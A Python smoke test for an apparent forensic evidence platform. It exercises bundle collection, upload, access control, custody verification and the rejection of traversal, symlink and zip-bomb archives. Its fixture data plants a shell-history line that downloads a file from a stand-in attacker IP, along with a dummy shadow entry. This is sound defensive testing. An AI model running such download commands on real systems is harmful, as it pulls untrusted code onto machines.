#!/usr/bin/env python3
"""Phase 5 live smoke test against the running compose stack (stdlib only).

    python scripts/phase5-smoke.py --admin-email E [--admin-password P] [--base URL]

1. the real Linux collector (collector/collect_linux.py) runs against a fake root and produces a
   bundle + .sha256; the collector hash is on the server's trust list;
2. an analyst uploads it as a triage_bundle with expected_sha256 from the sidecar; a viewer cannot
   start the ingest (403); the analyst's Process queues one bundle job (idempotent);
3. the worker verifies and extracts it; the auth.log member becomes derived evidence (parent link,
   signed custody chain that verifies) and its parse job puts 22 events in the timeline;
4. hostile fixture bundles (traversal, symlink, zip bomb) are rejected with nothing derived; a
   manifest-mismatch bundle ends partial with the member quarantined;
5. reprocessing the good bundle reuses the derived item. Exits non-zero on the first failure.
"""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import os
import tempfile
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / "backend" / "tests" / "fixtures"


def _load(name: str, path: Path) -> Any:
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


p1 = _load("phase1_smoke", ROOT / "scripts" / "phase1-smoke.py")
p2 = _load("phase2_smoke", ROOT / "scripts" / "phase2-smoke.py")
p3 = _load("phase3_smoke", ROOT / "scripts" / "phase3-smoke.py")
Api, expect, login, make_user = p1.Api, p1.expect, p1.login, p1.make_user


def collect(workdir: Path) -> tuple[bytes, str, str]:
    root = workdir / "root"
    files = {
        "etc/hostname": b"smoke-web01\n",
        "etc/timezone": b"UTC\n",
        "etc/passwd": b"root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n",
        "etc/shadow": b"root:$6$never-collected:19000::::::\n",
        "var/log/auth.log": (FIXTURES / "linux" / "auth.log").read_bytes(),
        "home/alice/.bash_history": b"curl -o /tmp/x http://203.0.113.9/x\n",
    }
    for rel, data in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_bytes(data)
    collector = _load("collect_linux", ROOT / "collector" / "collect_linux.py")
    out = workdir / "out"
    rc = collector.main(["--root", str(root), "--output", str(out), "--case-ref", "SMOKE-5"])
    expect(rc == 0, "Linux collector ran against a fake root")
    [bundle] = out.glob("*.zip")
    digest, name = (bundle.with_name(bundle.name + ".sha256")).read_text().split()
    expect(name == bundle.name, "collector wrote the .sha256 sidecar")
    return bundle.read_bytes(), digest, bundle.name


def upload_bundle(api: Any, token: str, cid: str, name: str, data: bytes, sha: str) -> str:
    status, body, _ = api.call(
        "POST",
        f"/cases/{cid}/evidence",
        token,
        {"kind": "triage_bundle", "original_name": name, "expected_sha256": sha},
    )
    expect(status == 201, f"create triage bundle {name}", body)
    eid = str(body["evidence"]["id"])
    status, body, _ = api.call("PUT", f"/evidence/{eid}/upload", token, raw=data)
    expect(status == 200, f"upload {name}", body)
    status, body, _ = api.call("POST", f"/evidence/{eid}/finalize", token)
    expect(status == 200 and body["ok"], f"finalize {name} (expected_sha256 matched)", body)
    return eid


def ingest(api: Any, token: str, eid: str) -> dict[str, Any]:
    status, body, _ = api.call("POST", f"/evidence/{eid}/process", token, {})
    expect(status == 202 and body["jobs"][0]["kind"] == "bundle", "bundle job queued", body)
    return dict(p2.wait_job(api, token, body["jobs"][0]["id"]))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--admin-email", required=True)
    parser.add_argument("--admin-password", default=os.environ.get("DFIR_ADMIN_PASSWORD"))
    args = parser.parse_args()
    api = Api(args.base)
    admin = login(api, args.admin_email, args.admin_password)
    _, lead = make_user(api, admin, "lead")
    analyst_id, analyst = make_user(api, admin, "analyst")
    viewer_id, viewer = make_user(api, admin, "viewer")
    _, outsider = make_user(api, admin, "analyst")
    status, case, _ = api.call("POST", "/cases", lead, {"title": "Phase 5 smoke"})
    expect(status == 201, "lead creates case", case)
    cid = case["id"]
    for uid, role in ((analyst_id, "analyst"), (viewer_id, "viewer")):
        status, body, _ = api.call(
            "POST", f"/cases/{cid}/members", lead, {"user_id": uid, "role": role}
        )
        expect(status == 200, f"lead adds {role}", body)

    # ---- 1-2: collect, upload, RBAC
    with tempfile.TemporaryDirectory() as tmp:
        data, sha, name = collect(Path(tmp))
    bundle_id = upload_bundle(api, analyst, cid, name, data, sha)
    status, body, _ = api.call("POST", f"/evidence/{bundle_id}/process", viewer, {})
    expect(status == 403, "viewer cannot start an ingest (403)", body)

    # ---- 3: ingest -> derived evidence -> parse -> timeline
    job = ingest(api, analyst, bundle_id)
    manifest = job.get("run_manifest") or {}
    counts = manifest.get("counts", {})
    expect(
        # Phase 6: the shell_history parser also derives the collected .bash_history
        job["status"] == "succeeded" and counts.get("ingested") == 2 and counts.get("flagged") == 0,
        f"bundle ingested: {counts}",
        job,
    )
    trust = manifest["bundle"]["collector_trust"]
    expect(trust["status"] == "trusted", "collector hash is on the trust list", trust)
    status, body, _ = api.call("POST", f"/evidence/{bundle_id}/process", analyst, {})
    expect(status == 202 and body["created"] == [], "second Process returns the same job", body)
    status, items, _ = api.call("GET", f"/cases/{cid}/evidence", analyst)
    derived = {
        e["original_name"]: e for e in items["items"] if e["parent_evidence_id"] == bundle_id
    }
    expect(
        len(derived) == 2
        and "logs/var/log/auth.log" in derived
        and any(n.endswith("/.bash_history") for n in derived),
        "auth.log (and, since Phase 6, .bash_history) became derived evidence of the bundle",
        sorted(derived),
    )
    did = derived["logs/var/log/auth.log"]["id"]
    status, summary, _ = api.call("GET", f"/evidence/{bundle_id}/bundle", viewer)
    expect(status == 200 and summary["outcome"] == "succeeded", "viewer reads the bundle", summary)
    paths = {m["member_path"] for m in summary["members"]}
    expect(not any("shadow" in p for p in paths), "no credential files in the bundle", paths)
    status, body, _ = api.call("GET", f"/evidence/{bundle_id}/bundle", outsider)
    expect(status == 404, "outsider gets 404 on the bundle summary", body)
    p3.settle(api, analyst, cid)
    events = p2.timeline(api, viewer, cid, f"evidence_id={did}")
    expect(len(events) == 22, "derived auth.log parsed into 22 timeline events", len(events))
    status, body, _ = api.call("GET", f"/evidence/{did}/custody", analyst)
    actions = [e["action"] for e in body["entries"]]
    expect(
        actions[:4] == ["created", "ingested", "hash_verified", "locked"]
        and "processed" in actions,
        "derived item has its own signed custody chain",
        actions,
    )
    status, body, _ = api.call("POST", f"/evidence/{did}/verify", analyst)
    expect(status == 200 and body["ok"] is True, "derived item verifies", body)
    status, body, _ = api.call("POST", f"/evidence/{bundle_id}/verify", analyst)
    expect(status == 200 and body["ok"] is True, "bundle still verifies (never modified)", body)

    # ---- 4: hostile and inconsistent bundles
    for fixture, code in (
        ("traversal_dotdot.zip", "unsafe_name"),
        ("symlink.zip", "symlink"),
        ("bomb_ratio.zip", "compression_ratio"),
    ):
        raw = (FIXTURES / "bundles" / fixture).read_bytes()
        eid = upload_bundle(api, analyst, cid, fixture, raw, hashlib.sha256(raw).hexdigest())
        job = ingest(api, analyst, eid)
        expect(
            job["status"] == "failed" and code in (job["error"] or ""),
            f"{fixture} rejected ({code})",
            job,
        )
    raw = (FIXTURES / "bundles" / "mismatch.zip").read_bytes()
    eid = upload_bundle(api, analyst, cid, "mismatch.zip", raw, hashlib.sha256(raw).hexdigest())
    job = ingest(api, analyst, eid)
    flagged = {f["path"]: f["status"] for f in job["run_manifest"]["flagged"]}
    expect(
        job["status"] == "partial" and flagged.get("logs/Security.evtx") == "hash_mismatch",
        "manifest mismatch quarantined (partial)",
        job,
    )
    status, items, _ = api.call("GET", f"/cases/{cid}/evidence", analyst)
    names = sorted(e["original_name"] for e in items["items"] if e["parent_evidence_id"] == eid)
    expect(names == ["logs/var/log/auth.log"], "only the verified member was derived", names)

    # ---- 5: reprocess reuses derived items
    status, body, _ = api.call("POST", f"/jobs/{manifest['job_id']}/reprocess", analyst)
    expect(status == 202, "bundle reprocess queued", body)
    job = p2.wait_job(api, analyst, body["id"])
    expect(
        job["status"] == "succeeded" and job["run_manifest"]["counts"].get("derived_new") == 0,
        "reprocess reused the derived item",
        job,
    )
    p3.settle(api, analyst, cid)
    print("PHASE 5 SMOKE PASSED")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
